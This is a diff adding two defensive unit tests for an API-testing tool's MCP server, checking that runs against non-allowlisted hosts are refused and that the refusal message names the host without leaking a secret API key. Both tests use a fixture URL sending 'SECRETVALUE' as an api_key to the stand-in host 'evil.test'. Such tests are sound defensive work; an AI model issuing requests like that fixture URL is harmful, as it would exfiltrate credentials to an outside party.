@@ -3612,6 +3612,33 @@ describe("run_collection", () => {
 		expect(client.composeRequest).toHaveBeenCalledTimes(2);
 	});
 
+	test("the refusal names the host and withholds the resolved URL (#1892)", async () => {
+		const client = scenarioClient({
+			getGlobals: vi.fn().mockResolvedValue({
+				id: "globals",
+				variables: { api_key: { value: "SECRETVALUE", secret: true, enabled: true } },
+			}),
+			composeRequest: vi.fn().mockImplementation(({ requestId }: { requestId: string }) =>
+				Promise.resolve({
+					method: "GET",
+					url:
+						requestId === "r2"
+							? "https://evil.test/x?api_key=SECRETVALUE"
+							: `https://api.example.com/${requestId}`,
+				})
+			),
+		});
+		const res = await dispatchTool(
+			"run_collection",
+			{ collectionId: "c1" },
+			ctxWith(client, { allowlist: ["api.example.com"] })
+		);
+		expect(res.isError).toBe(true);
+		expect(firstText(res)).toMatch(/evil\.test/);
+		expect(firstText(res)).not.toMatch(/SECRETVALUE/);
+		expect(client.startRun).not.toHaveBeenCalled();
+	});
+
 	test("a step that cannot compose refuses the run rather than starting a plan the engine would reject", async () => {
 		const client = scenarioClient({
 			composeRequest: vi
@@ -3867,6 +3894,38 @@ describe("start_load_run scenario runs", () => {
 			duration: "30s",
 			origin: { kind: "mcp" },
 		});
+	});
+
+	test("an un-allowlisted step's refusal names the host and withholds the resolved URL (#1892)", async () => {
+		const client = scenarioLoadClient({
+			getGlobals: vi.fn().mockResolvedValue({
+				id: "globals",
+				variables: { api_key: { value: "SECRETVALUE", secret: true, enabled: true } },
+			}),
+			listRequests: vi.fn().mockResolvedValue([
+				{ id: "r1", name: "login" },
+				{ id: "r2", name: "offsite" },
+			]),
+			composeRequest: vi.fn().mockImplementation(({ requestId }: { requestId: string }) =>
+				Promise.resolve({
+					method: "GET",
+					url:
+						requestId === "r2"
+							? "https://evil.test/x?api_key=SECRETVALUE"
+							: "https://api.example.com/login",
+				})
+			),
+		});
+		const res = await dispatchTool(
+			"start_load_run",
+			{ scenario: { collectionId: "c1" }, confirmed: true },
+			ctxWith(client, allowed)
+		);
+		expect(res.isError).toBe(true);
+		expect(firstText(res)).toMatch(/step 1 \(request 'offsite', id 'r2'\)/);
+		expect(firstText(res)).toMatch(/evil\.test/);
+		expect(firstText(res)).not.toMatch(/SECRETVALUE/);
+		expect(client.startRun).not.toHaveBeenCalled();
 	});
 
 	test("refuses the single-target arguments by name instead of ignoring them", async () => {
